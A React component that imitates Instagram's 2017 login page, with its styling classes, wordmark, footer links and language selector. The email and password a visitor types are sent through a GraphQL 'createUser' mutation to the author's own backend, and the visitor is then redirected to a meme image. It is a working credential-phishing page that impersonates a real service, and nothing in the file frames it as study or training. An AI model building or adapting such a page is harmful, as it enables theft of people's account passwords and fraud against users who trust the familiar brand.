import React from 'react'
import { withRouter } from 'react-router'
import { graphql, gql } from 'react-apollo'

class CreateUserIg extends React.Component {

  static propTypes = {
    router: React.PropTypes.object.isRequired,
    createUser: React.PropTypes.func.isRequired,
    // signinUser: React.PropTypes.func.isRequired,
    data: React.PropTypes.object.isRequired,
  }

  state = {
    email: this.props.location.query.email || '',
    password: '',
    name: '',
    emailSubscription: false,
  }

  render () {
    if (this.props.data.loading) {
      return (<div>Loading</div>)
    }

    // redirect if user is logged in
    if (this.props.data.user) {
      console.warn('already logged in')
      // this.props.router.replace('/')
    }

    return (
          <section className="_tlwfg _8f735">
            <main className="_6ltyr _rnpza">
               <div className="_7x34g">
                  <article className="_7xj0z">
                     <div className="_p8ymb">
                        <div className="_nvyyp">
                           <h1 className="_du7bh _soakw coreSpriteLoggedOutWordmark">Instagram</h1>
                           <div className="_uikn3">
                               <div className="_ccek6 _i31zu">
                                  <input type="text" className="_kp5f7 _qy55y" 
                                  placeholder="Email"  onChange={(e) => this.setState({email: e.target.value})} />
                                  <div className="_j4ox0"></div>
                               </div>
                               <div className="_ccek6 _i31zu">
                                  <input type="password" className="_kp5f7 _1mdqd _qy55y" placeholder="Password" 
                                   onChange={(e) => this.setState({password: e.target.value})}/>
                                  <div className="_j4ox0"><a className="_19gtn" href="https://www.instagram.com/accounts/password/reset/">Forgot?</a></div>
                               </div>
                               <span className="_rz1lq _7k49n"><button className="_ah57t _84y62 _i46jh _rmr7s"  onClick={this.createUser}>Log in</button></span>
                           </div>
                        </div>
                        <div className="_nvyyp">
                           <p className="_dyp7q">
                             Don't have an account? <a className="_fcn8k" href="javascript:;">Sign up</a>
                           </p>
                        </div>

                     </div>
                  </article>
               </div>
            </main>
            <footer className="_oofbn">
               <div className="_mhrsk _pcuq6" style={{maxWidth: '935px'}}>
                  <nav className="_p1gbi" >
                     <ul className="_fh0f2">
                        <li className="_fw3ds"><a className="_c4mil" href="https://www.instagram.com/about/us/">About us</a></li>
                        <li className="_fw3ds"><a className="_c4mil" href="https://help.instagram.com/">Support</a></li>
                        <li className="_fw3ds"><a className="_c4mil" href="http://blog.instagram.com/">Blog</a></li>
                        <li className="_fw3ds"><a className="_c4mil" href="https://instagram-press.com/">Press</a></li>
                        <li className="_fw3ds"><a className="_c4mil" href="https://www.instagram.com/developer/">API</a></li>
                        <li className="_fw3ds"><a className="_c4mil" href="https://www.instagram.com/about/jobs/">Jobs</a></li>
                        <li className="_fw3ds"><a className="_c4mil" href="https://www.instagram.com/legal/privacy/">Privacy</a></li>
                        <li className="_fw3ds"><a className="_c4mil" href="https://www.instagram.com/legal/terms/">Terms</a></li>
                        <li className="_fw3ds"><a className="_c4mil" href="https://www.instagram.com/explore/locations/">Directory</a></li>
                        <li className="_fw3ds">
                           <span className="_17z9g _c4mil">
                              Language
                              <select className="_nif11">
                                 <option value="af">Afrikaans</option>
                                 <option value="cs">Čeština</option>
                                 <option value="da">Dansk</option>
                                 <option value="de">Deutsch</option>
                                 <option value="el">Ελληνικά</option>
                                 <option value="en">English</option>
                                 <option value="es">Español</option>
                                 <option value="fi">Suomi</option>
                                 <option value="fr">Français</option>
                                 <option value="id">Bahasa Indonesia</option>
                                 <option value="it">Italiano</option>
                                 <option value="ja">日本語</option>
                                 <option value="ko">한국어</option>
                                 <option value="ms">Bahasa Melayu</option>
                                 <option value="nb">Norsk</option>
                                 <option value="nl">Nederlands</option>
                                 <option value="pl">Polski</option>
                                 <option value="pt-br">Português (Brasil)</option>
                                 <option value="pt">Português (Portugal)</option>
                                 <option value="ru">Русский</option>
                                 <option value="sv">Svenska</option>
                                 <option value="th">ภาษาไทย</option>
                                 <option value="tl">Filipino</option>
                                 <option value="tr">Türkçe</option>
                                 <option value="zh-cn">中文(简体)</option>
                                 <option value="zh-tw">中文(台灣)</option>
                                 <option value="bn">বাংলা</option>
                                 <option value="gu">ગુજરાતી</option>
                                 <option value="hi">हिन्दी</option>
                                 <option value="hr">Hrvatski</option>
                                 <option value="hu">Magyar</option>
                                 <option value="kn">ಕನ್ನಡ</option>
                                 <option value="ml">മലയാളം</option>
                                 <option value="mr">मराठी</option>
                                 <option value="ne">नेपाली</option>
                                 <option value="pa">ਪੰਜਾਬੀ</option>
                                 <option value="si">සිංහල</option>
                                 <option value="sk">Slovenčina</option>
                                 <option value="ta">தமிழ்</option>
                                 <option value="te">తెలుగు</option>
                                 <option value="ur">اردو</option>
                                 <option value="vi">Tiếng Việt</option>
                                 <option value="zh-hk">中文(香港)</option>
                                 <option value="bg">Български</option>
                                 <option value="fr-ca">Français (Canada)</option>
                                 <option value="ro">Română</option>
                                 <option value="sr">Српски</option>
                                 <option value="uk">Українська</option>
                              </select>
                           </span>
                        </li>
                     </ul>
                  </nav>
                  <span className="_es4h6">© 2017 Instagram</span>
               </div>
            </footer>
            <div className="_s1xpw _44kmz">
               <div className="_plwoo"></div>
            </div>
         </section>
    )
  }

  createUser = () => {
    const {email, password} = this.state

    this.props.createUser({variables: {email, password}})
      .then((response) => {
        window.location.href = "https://i.imgflip.com/1sevnt.jpg";
      }).catch((e) => {
        console.error(e)
        this.props.router.replace('/')
      })
  }
}

const createUser = gql`
  mutation ($email: String!, $password: String!) {
    createUser(authProvider: {email: {email: $email, password: $password}}) {
      email
    }
  }
`

const userQuery = gql`
  query {
    user {
      id
    }
  }
`

export default graphql(createUser, {name: 'createUser'})(
  graphql(userQuery, { options: { fetchPolicy: 'network-only' }})(
    withRouter(CreateUserIg))
)
